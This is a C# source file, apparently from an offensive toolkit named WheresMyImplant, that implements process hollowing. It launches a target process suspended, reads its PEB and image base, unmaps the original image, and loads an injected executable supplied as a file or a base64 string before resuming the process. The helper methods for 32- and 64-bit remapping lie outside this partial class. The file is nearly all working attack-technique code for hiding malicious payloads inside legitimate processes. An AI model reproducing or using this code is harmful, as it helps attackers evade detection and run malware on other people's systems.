using System;
using System.Runtime.InteropServices;

using Unmanaged.Headers;
using Unmanaged.Libraries;

namespace WheresMyImplant
{
    //https://github.com/idan1288/ProcessHollowing32-64/blob/master/ProcessHollowing/ProcessHollowing.c
    //https://github.com/m0n0ph1/Process-Hollowing/blob/master/sourcecode/ProcessHollowing/ProcessHollowing.cpp

    partial class HollowProcess : Base, IDisposable
    {
        Winbase._PROCESS_INFORMATION lpProcessInformation;
        IntPtr targetImageBaseAddress;

        IntPtr allocatedTargetAddress;
        Winnt._IMAGE_FILE_HEADER targetFileHeader;
        
        Byte[] image;
        GCHandle pinnedArray;
        IntPtr imagePtr;
        Winnt._IMAGE_FILE_HEADER imageFileHeader;
        Winnt._IMAGE_DOS_HEADER imageDosHeader;
        
        
        
        

        Boolean is32Bit;

        ////////////////////////////////////////////////////////////////////////////////
        // Default Constructor
        ////////////////////////////////////////////////////////////////////////////////
        internal HollowProcess()
        {
            lpProcessInformation = new Winbase._PROCESS_INFORMATION();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Creates a suspended process, and then opens a handle to the process
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean CreateSuspendedProcess(String lpApplicationName)
        {
            String lpCommandLine = lpApplicationName;
            Winbase._SECURITY_ATTRIBUTES lpProcessAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._SECURITY_ATTRIBUTES lpThreadAttributes = new Winbase._SECURITY_ATTRIBUTES();
            Winbase._STARTUPINFO lpStartupInfo = new Winbase._STARTUPINFO();

            if (!kernel32.CreateProcess(
                lpApplicationName,
                lpCommandLine,
                ref lpProcessAttributes,
                ref lpThreadAttributes,
                false,
                Winbase.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref lpStartupInfo,
                out lpProcessInformation
            ))
            {
                return false;
            }

            WriteOutputGood(String.Format("Started Process: {0}", lpProcessInformation.dwProcessId));
            WriteOutputGood(String.Format("Started Thread:  {0}", lpProcessInformation.dwThreadId));
            WriteOutputGood(String.Format("Recieved Handle: 0x{0}", lpProcessInformation.hProcess.ToString("X4")));

            return ReadPEB();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the PEB Base Address from NtQueryInformationProcess then reads the PEB
        // to get the image base address
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadPEB()
        {
            UInt32 processInformationLength = (UInt32)Marshal.SizeOf(typeof(ntdll._PROCESS_BASIC_INFORMATION));
            IntPtr processInformation = Marshal.AllocHGlobal((Int32)processInformationLength);
            ntdll._PROCESS_BASIC_INFORMATION processBasicInformation;
            try
            {
                UInt32 returnLength = 0;
                UInt32 returnStatus = ntdll.NtQueryInformationProcess(
                    lpProcessInformation.hProcess,
                    ntdll.PROCESSINFOCLASS.ProcessBasicInformation,
                    processInformation,
                    processInformationLength,
                    ref returnLength
                );

                if (0 != returnStatus)
                {
                    return false;
                }
                processBasicInformation = (ntdll._PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(processInformation, typeof(ntdll._PROCESS_BASIC_INFORMATION));
            }
            catch (Exception)
            {
                WriteOutputBad("ReadPEB Failed");
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(processInformation);
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral(String.Format("PEB Base Address:   0x{0}", processBasicInformation.PebBaseAddress.ToString("X4")));
            Winternl._PEB64 peb;
            UInt32 pebSize = (UInt32)Marshal.SizeOf(typeof(Winternl._PEB64));
            IntPtr buffer = Marshal.AllocHGlobal((Int32)pebSize);
            try
            {
                UInt32 returnSize = 0;
                if (!kernel32.ReadProcessMemory64(
                    lpProcessInformation.hProcess,
                    (UInt64)processBasicInformation.PebBaseAddress.ToInt64(),//context.Rdx 
                    buffer,
                    pebSize,
                    ref returnSize))
                {
                    return false;
                }
                peb = (Winternl._PEB64)Marshal.PtrToStructure(buffer, typeof(Winternl._PEB64));
                targetImageBaseAddress = peb.ImageBaseAddress;
                WriteOutputNeutral(String.Format("Image Base Address: 0x{0}", targetImageBaseAddress.ToString("X4")));
            }
            catch (Exception error)
            {
                WriteOutputBad("ReadPEB Failed");
                return false;
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }

            is32Bit = !Misc.Is64BitProcess(lpProcessInformation.hProcess);
            return GetContext();
        }

        ////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean GetContext()
        {
            if (!(is32Bit ? GetContext32() : GetContext64()))
            {
                return false;
            }

            return ReadNTHeaders();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads the NT Headers from the Image Base Address
        // This doesn't appear to have any useful function
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadNTHeaders()
        {
            return is32Bit ? ReadNTHeaders32() : ReadNTHeaders64();
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads in the image to be injected
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadSourceImageFile(String sourceImage)
        {
            String file = System.IO.Path.GetFullPath(sourceImage);
            if (!System.IO.File.Exists(file))
            {
                WriteOutputBad("File Not Found");
                return false;
            }

            image = System.IO.File.ReadAllBytes(file); 
            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
            imagePtr = pinnedArray.AddrOfPinnedObject();

            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
            imageFileHeader = (Winnt._IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(ntHeaderPtr.ToInt64() + sizeof(UInt32)), typeof(Winnt._IMAGE_FILE_HEADER));
            if (is32Bit)
            {
                imageNTHeader32 = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS));
            }
            else
            {
                imageNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reads in the image to be injected
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ReadSourceImageString(String sourceImage)
        {
            image = Convert.FromBase64String(sourceImage);
            pinnedArray = GCHandle.Alloc(image, GCHandleType.Pinned);
            imagePtr = pinnedArray.AddrOfPinnedObject();

            imageDosHeader = (Winnt._IMAGE_DOS_HEADER)Marshal.PtrToStructure(imagePtr, typeof(Winnt._IMAGE_DOS_HEADER));
            IntPtr ntHeaderPtr = new IntPtr(imagePtr.ToInt64() + imageDosHeader.e_lfanew);
            imageFileHeader = (Winnt._IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(ntHeaderPtr.ToInt64() + sizeof(UInt32)), typeof(Winnt._IMAGE_FILE_HEADER));
            if (is32Bit)
            {
                imageNTHeader32 = (Winnt._IMAGE_NT_HEADERS)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS));
            }
            else
            {
                imageNTHeader64 = (Winnt._IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeaderPtr, typeof(Winnt._IMAGE_NT_HEADERS64));
            }
            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Figure out how to reuse alloced memory
        // Todo Fix the Page_Execute_Read_Write
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean RemapImage()
        {

            if (image.Length > (is32Bit ? imageNTHeader32.OptionalHeader.SizeOfImage : imageNTHeader64.OptionalHeader.SizeOfImage))
            {
                WriteOutputNeutral(String.Format("NtUnmapViewOfSection: 0x{0}", targetImageBaseAddress.ToString("X4")));
                UInt32 result = ntdll.NtUnmapViewOfSection(lpProcessInformation.hProcess, targetImageBaseAddress);
                if (0 != result)
                {
                    WriteOutputBad("NtUnmapViewOfSection Failed");
                    return false;
                }
                
            }
            //Move Virtual AllocexEx in here
            return is32Bit ? RemapImage32() : RemapImage64();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ResumeProcess(Boolean bWait)
        {
            return is32Bit ? ResumeProcess32(bWait) : ResumeProcess64(bWait);
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Close Used Handles
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            pinnedArray.Free();

            if (IntPtr.Zero != lpProcessInformation.hProcess)
            {
                kernel32.CloseHandle(lpProcessInformation.hProcess);
            }

            if (IntPtr.Zero != lpProcessInformation.hThread)
            {
                kernel32.CloseHandle(lpProcessInformation.hThread);
            }

            if (IntPtr.Zero != allocatedTargetAddress)
            {
                kernel32.CloseHandle(allocatedTargetAddress);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Default Destructor
        ////////////////////////////////////////////////////////////////////////////////
        ~HollowProcess()
        {
            Dispose();
        }
    }
}